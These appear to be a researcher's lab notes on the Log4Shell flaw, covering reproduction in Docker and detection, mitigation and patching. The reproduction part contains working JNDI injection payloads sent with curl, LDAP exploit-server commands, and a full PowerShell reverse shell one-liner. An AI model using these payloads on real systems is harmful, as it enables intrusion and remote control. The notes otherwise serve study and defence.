# log4j

## 信息

https://github.com/NCSC-NL/log4shell

各产品影响
https://github.com/YfryTchsGD/Log4jAttackSurface

https://github.com/cisagov/log4j-scanner
## 复现

[CVE-2021-44228 - Log4j - MINECRAFT VULNERABLE! (and SO MUCH MORE)](https://www.youtube.com/watch?v=7qoPDq41xhQ)

```bash
https://github.com/leonjza/log4jpwn
git clone git@github.com:leonjza/log4jpwn.git
docker build -t log4jpwn .
docker run --rm -p8080:8080 log4jpwn
  java -jar target/log4jpwn-1.0-SNAPSHOT-jar-with-dependencies.jar
nc -lnvp 8888
curl -v -H 'User-Agent: ${jndi:ldap://172.17.0.1:8888/a}' 'localhost:8080/${jndi:ldap://172.17.0.1:8888/a}/?pwn=$\{jndi:ldap://172.17.0.1:8888/a\}'
```

[marshalsec](https://github.com/mbechler/marshalsec)

```bash
git clone git@github.com:mbechler/marshalsec.git
mvn clean package -DskipTests.

# https://hub.docker.com/_/maven?tab=tags

docker pull maven:3.8.4-openjdk-8

# https://github.com/christophetd/log4shell-vulnerable-app/blob/main/Dockerfile
FROM openjdk:8u181-jdk-alpine

FROM maven:3.8.4-openjdk-8
COPY . /usr/src/myapp
WORKDIR /usr/src/myapp
RUN mvn clean package -DskipTests
RUN mvn clean package -Dmaven.test.skip=true

docker build -t marshalsec .
nc -lnvp 9999
```

[maven跳过单元测试-maven.test.skip和skipTests的区别](https://www.cnblogs.com/javabg/p/8026881.html)
-DskipTests，不执行测试用例，但编译测试用例类生成相应的class文件至target/test-classes下。
-Dmaven.test.skip=true，不执行测试用例，也不编译测试用例类。
一 使用maven.test.skip，不但跳过单元测试的运行，也跳过测试代码的编译。

如果遇到 WARNING: Illegal reflective access by com.thoughtworks.xstream.core.util.Fields
[Eureka 中 JDK 11 遇到的问题](https://blog.csdn.net/YKenan/article/details/105959843)
只是警告，不管

https://github.com/xiajun325/apache-log4j-rce-poc

```bash
git clone git@github.com:xiajun325/apache-log4j-rce-poc.git

docker run -v `pwd`/:/root/poc  marshalsec javac /root/poc/src/main/java/Log4jRCE.java

# https://www.cnblogs.com/mingforyou/p/3551199.html
javac Log4jRCE.java
php -S 127.0.0.1:8888

python -m http.server
# http://localhost:8000/

docker cp /usr/src/myapp/target/marshalsec-0.0.3-SNAPSHOT-all.jar ./
java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8000/#Log4jRCE"
java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8000/Log4jRCE"

docker run --rm --name log4jpwn -p8080:8080 log4jpwn

curl -v -H 'User-Agent: ${jndi:ldap://172.29.78.192:1389/a}' 'localhost:8080/${jndi:ldap://172.29.78.192:1389/a}/?pwn=$\{jndi:ldap://172.29.78.192:1389/a\}'

curl -v -H 'User-Agent: ${jndi:ldap://172.29.78.192:1389/Log4jRCELinux}' 'localhost:8080'
curl -v -H 'User-Agent: ${jndi:ldap://172.29.78.192:1389/Log4jRCE}' 'localhost:8080'
172.17.0.2
# vim Log4jRCE.java
Runtion.getRuntime().exec("calc.exe")
```

```bash
 mvn --quiet clean -f "d:\dev\lab\apache-log4j-rce-poc\pom.xml" && mvn --quiet org.apache.maven.plugins:maven-dependency-plugin:3.0.2:tree -f "d:\dev\lab\apache-log4j-rce-poc\pom.xml" -DoutputFile="d:\dev\lab\apache-log4j-rce-poc\target\dependencies.txt" -DoutputType=dot -DappendOutput=true 'mvn'
```

${jndi:ldap://xxx/Log4jRCE}

反向

[powershell reverse shell one liner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)

```powershell
# Nikhil SamratAshok Mittal: http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html

$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

https://raikia.com/tool-powershell-encoder/

GOOGLE: powershell encode raikou base64

https://amsi.fail

再把calc.exe 代替成上面的编码shell

nc -lnvp 9898 
做为执行端
RCE中需要打开
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

JDK版本的默认值和JNDI注入的关系可以参考
https://websec.readthedocs.io/zh/latest/language/java/jdk.html

如何绕过高版本JDK的限制进行JNDI注入利用
https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html

https://davinsi.com/threat-advisory-apache-log4j-rce/
Java 8u121 (see https://www.oracle.com/java/technologies/javase/8u121-relnotes.html ) protects 
against RCE by defaulting com.sun.jndi.rmi.object.trustURLCodebase and com.sun.jndi.cosnaming.object.trustURLCodebase to false.

### 在线测试端口

https://log4shell.huntress.com/

docker run 
curl -H

### minecraft

https://papermc.io/

```powershell
@echo off
java -Xms2G -Xms2G -jar paper-1.8.8-443.jar
pause
```

eula.txt
eula=true

https://www.minecraft.net
https://help.minecraft.net/hc/en-us/articles/4416199399693-Security-Vulnerability-in-Minecraft-Java-Edition

### 影响监控

https://www.greynoise.io/
https://www.greynoise.io/viz/query/?gnql=tags%3A%22Apache%20Log4j%20RCE%20Attempt%22
https://gist.github.com/superducktoes/b642c6f5de4f19a3715675303e0d6357
https://gist.github.com/gnremy/c546c7911d5f876f263309d7161a7217

### docker 靶机

https://github.com/christophetd/log4shell-vulnerable-app
docker build . -t vulnerable-app
docker run -p 8081:8080 --name vulnerable-app vulnerable-app

curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
curl 127.0.0.1:8081 -H 'X-Api-Version: ${jndi:ldap://78769f89.dns.1433.eu.org:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

jdeps /app/spring-boot-application.jar
jdeps  -summary -recursive /app/spring-boot-application.jar

$ jdeps --class-path 'libs/*' -recursive sh-2.6.3.jar

jar tvf yourjar.jar | perl -nle'BEGIN{$depth=(shift)-1}print join(".", (split(/\//, (split)[-1]))[0..$depth])' 3

https://github.com/huntresslabs/log4shell-tester
https://github.com/Cybereason/Logout4Shell

### LDAP

自用的LDAP测试工具，一键启动
https://github.com/EmYiQing/LDAPKit

https://github.com/WazeHell/sam-the-admin
Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user

### 其它POC

https://github.com/kozmer/log4j-shell-poc

### DNSLOG

[](./sec.dnslog.md)

## 发现

https://github.com/whwlsfb/Log4j2Scan
Log4j2 RCE Passive Scanner plugin for BurpSuite

https://github.com/tangxiaofeng7/BurpLog4j2Scan

https://github.com/Neo23x0/log4shell-detector
从/var/log里看是否受到了攻击 

https://github.com/hillu/local-log4j-vuln-scanner

https://stackoverflow.com/questions/70361367/how-to-find-vulnerable-log4j-programs-on-a-windows-10-pc-and-how-to-provide-firs/70361504

I provided the first-aid PowerShell script in the other answer, however, meanwhile there are several advanced tools that allow detection and patching of log4j-based applications, in context of CVE-2021-44228, for the case that you cannot upgrade the application and its bundled log4j, yet.

https://github.com/mergebase/log4j-detector

log4j-detector is a Java-based tool that searches for vulnerable log4j instances. It detects log4j in "Java Über JARs" as well as otehr JARs/WARs, in uncompressed directories on the file-system (aka *.class) and in shaded jars. It provides information about the found log4j versions. (It does not provide a patcher to fix the findings.) But this one seems to be most thorough in its detection.

https://github.com/hillu/local-log4j-vuln-scanner

log4j-vuln-scanner is a Go-based tool, with binary releases for x86_64 Windows, Linux, MacOSX,that searches for vulnerable log4j instances. It finds log4j also within other JAR and WAR files and it provides information about the found log4j versions. (It seems not as thorough as the log4j-detector above.) But this one provides a patcher to fix the findings.

https://github.com/Neo23x0/log4shell-detector

log4shell-detector is a python-based tool that searches for log files and, from the logs strings, tries to detect any exploitation attempts.

## WAF

https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words

## 补丁

删除 lookup包
https://stackoverflow.com/questions/70361367/how-to-find-vulnerable-log4j-programs-on-a-windows-10-pc-and-how-to-provide-firs/70361504
https://discuss.elastic.co/t/delete-jndilookup-class/291507
sha1sum log4j-core-2.14.0.jar
echo "8dd10000eb1b768800000e1d2fe1c3100005d2dc *filename" | sha1sum -c -
echo "e257b0562453f73eabac1bc3181ba33e79d193ed  log4j-core-2.14.0.jar" | sha1sum -c -
openssl sha1 <file>

zip -q -d log4j-core-2.14.0.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
sha1sum log4j-core-2.14.0.jar
5de0d92e9719c1b7b92e7390e91ef46571d7102f  log4j-core-2.14.0.jar
jar vtf log4j-core-2.14.0.jar |findstr  JndiLookup

zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class

https://bmcsites.force.com/casemgmt/sc_KnowledgeArticle?sfdcid=000391450

使用增加的包：
https://research.nccgroup.com/2021/12/12/log4j-jndi-be-gone-a-simple-mitigation-for-cve-2021-44228/

### 升级版本

最新为 2.16.0 ,升级到 2.15.0 时出现新的漏洞，会造成DDOS
https://logging.apache.org/log4j/2.x/

It was found that the fix to address CVE-2021-44228 in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. 
This could allows attackers with control over Thread Context Map (MDC) input data when the logging configuration uses a Pattern Layout with either a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Map pattern (%X, %mdc, or %MDC) to craft malicious input data using a JNDI Lookup pattern resulting in a denial of service (DOS) attack. Log4j 2.15.0 restricts JNDI LDAP lookups to localhost by default.

这个对应的 https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-log4j2
是已经升级到 2.15.0 的

### 运行时的热补丁

https://github.com/corretto/hotpatch-for-apache-log4j2

APACHE LOG4J2 远程代码执行漏洞处置手册
http://blog.nsfocus.net/apache-log4j2/

Apache Solr

Apache Struts2

Apache Flink

Apache Druid

spring-boot-strater-log4j2

## 20211210

Remote code injection in Log4j
https://github.com/advisories/GHSA-jfh8-c2jp-5v3q

【安全通报】Apache Log4j2 远程代码执行漏洞
https://nosec.org/home/detail/4917.html
  Vulfocus 靶场环境
  目前 Vulfocus 已经集成 Log4j2 环境，可通过以下链接启动环境测试：
  http://vulfocus.fofa.so/#/dashboard?image_id=3b8f15eb-7bd9-49b2-a69e-541f89c4216c

  漏洞利用及POC验证
  poc:
  ${jndi:ldap://xxxxx.dnslog.cn/exp}
  ${jndi:rmi://xxxxx.dnslog.cn/exp}
到这里获得一个 地址
http://dnslog.cn/
如：mixazx.dnslog.cn
本地 ping mixazx.dnslog.cn
Refresh Record，发现有记录
找一个有 log4j 日志使用的应用，发送

${jndi:ldap://mixazx.dnslog.cn/exp}
${jndi:rmi://mixazx.dnslog.cn/exp}
做为参数

http://ceye.io/records/dns
https://log.xn--9tr.com/
这个有点慢
http://dnslog.cn/
[DNS 原理入门](https://www.ruanyifeng.com/blog/2016/06/dns.html)

[Apache Log4j远程代码执行漏洞风险通报信息汇总](https://www.freebuf.com/articles/308151.html)

POC：
https://www.lunasec.io/docs/blog/log4j-zero-day/
https://github.com/azhao1981/apache-log4j-poc

【重要通知】关于Apache Log4j 2远程代码执行最新漏洞的风险提示
https://itsc.nju.edu.cn/7a/42/c41947a555586/page.htm
【紧急补救措施】

（1）  修改jvm参数 -Dlog4j2.formatMsgNoLookups=true     
（2）  修改配置log4j2.formatMsgNoLookups=True
（3）  将系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true
  TODO: 需要重启吗？还是写在bash里就可以了

## 厂商声明

https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot
 Elasticsearch
  Elasticsearch is not susceptible to remote code execution with this vulnerability due to our use of the Java Security Manager. Elasticsearch on JDK8 or below is susceptible to an information leak via DNS which is fixed by a simple JVM property change. The information leak does not permit access to data within the Elasticsearch cluster. We will also release a new version of Elasticsearch that contains the JVM property by default and removes certain components of Log4j out of an abundance of caution. Additional details below.
  由于我们使用Java Security Manager, Elasticsearch不容易受到带有此漏洞的远程代码执行的影响。 
  在JDK8或更低版本上的Elasticsearch容易通过DNS发生信息泄漏，这可以通过简单的JVM属性更改来修复。 
  信息泄漏不允许访问Elasticsearch集群中的数据。 
  我们还将发布一个新版本的Elasticsearch，该版本默认包含JVM属性，为了谨慎起见，它删除了Log4j的某些组件。 

### tomcat

https://tomcat.apache.org/tomcat-8.0-doc/logging.html#Using_Log4j
tomcat 默认不使用log4j2

### 其它参考

安全工具 | log4j ldap 恶意class下载工具
https://www.anquanke.com/post/id/263300
Log4J 漏洞复现+漏洞靶场
https://www.anquanke.com/post/id/263132
Log4shell漏洞研究及其挖矿案例分析
https://www.anquanke.com/post/id/263217

在 Struts2 中触发 Log4j JNDI RCE 漏洞分析
https://www.anquanke.com/post/id/262852


Apache Log4j2远程代码执行漏洞排查及修复手册
https://www.cnvd.org.cn/webinfo/show/7146
从零到一带你深入 log4j2 Jndi RCE CVE-2021-44228 漏洞
https://paper.seebug.org/1789/
好像这里并没有修改，还是可以下载
https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.0/

https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api
https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core


Apache Log4j2 Jndi RCE 高危漏洞分析与防御
https://paper.seebug.org/1787/
log4shell 分析
https://paper.seebug.org/1788/
log4j2 漏洞分析与思考
https://paper.seebug.org/1786/


```bash
#!/bin/bash

find_jar() {
  sudo lsof | grep .jar > log4j-find.txt
  cat log4j-find.txt | awk '{print $10}' | sort | uniq > log4j-find-sorted.txt
  cat log4j-find.txt | awk '{print $9}' | sort | uniq | grep .jar >> log4j-find-sorted.txt
  cat log4j-find-sorted.txt | sort | uniq > log4j-find-sorted-uniq.txt
}


cat log4j-find-sorted-uniq.txt | grep log4j-core > log4j-find.result.txt
cat log4j-find-sorted-uniq.txt | xargs busybox unzip -lx | grep log4j-core > log4j-find.result.jar.txt

ls -l *.jar | awk '{print $9}' | xargs busybox unzip -lx
# jar vtf *.jar |grep JndiLookup.class
busybox unzip
unzip -l log4j-core-2.8.2.jar |grep -i lookup
org/apache/logging/log4j/core/lookup/JndiLookup.class

```


```bash
#!/bin/bash

remove(){
  cd /CloudrResetPwdAgent/bin
  sudo ./cloudResetPwdAgent.script remove
  cd /CloudResetPwdUpdateAgent/bin
  sudo ./cloudResetPwdUpdateAgent.script stop
  sudo ./cloudResetPwdUpdateAgent.script remove
  sudo rm -rf /CloudrResetPwdAgent
  sudo rm -rf /CloudResetPwdUpdateAgent
}

status(){
  service cloudResetPwdAgent status
  service cloudResetPwdUpdateAgent status
}

install(){
  wget 'http://cn-south-1-cloud-reset-pwd.obs.myhwclouds.com/linux/64/reset_pwd_agent/CloudResetPwdAgent.zip'

  unzip -o -d  / CloudResetPwdAgent.zip
  cd /CloudResetPwdAgent/CloudResetPwdUpdateAgent.Linux
  chmod +x setup.sh
  sudo sh setup.sh

  # 修改重置密码插件的文件权限
  chmod 640 /CloudrResetPwdAgent/logs/resetPwdAgent.log
  chmod 640 /CloudrResetPwdAgent/logs/wrapper.log
  chmod 750 /CloudrResetPwdAgent/bin/cloudResetPwdAgent.script
  chmod 700 /CloudrResetPwdAgent/bin/wrapper
  chmod 600 /CloudrResetPwdAgent/lib/commons-codec-1.14.jar
  chmod 600 /CloudrResetPwdAgent/lib/libwrapper.so
  chmod 600 /CloudrResetPwdAgent/lib/resetpwdagent.jar
  chmod 600 /CloudrResetPwdAgent/lib/wrapper.jar
  chmod 640 /CloudrResetPwdAgent/lib/json-20160810.jar
  chmod 640 /CloudrResetPwdAgent/lib/log4j-api-2.17.0.jar
  chmod 640 /CloudrResetPwdAgent/lib/log4j-core-2.17.0.jar
}

if [ "$1" == "remove" ]; then
  remove
elif [ "$1" == "status" ]; then
  status
elif [ "$1" == "install" ]; then
  install
  status
elif [ "$1" == "reinstall" ]; then
  remove
  install
  status
else
  echo "Usage: $0 {install|remove|status}"
fi
```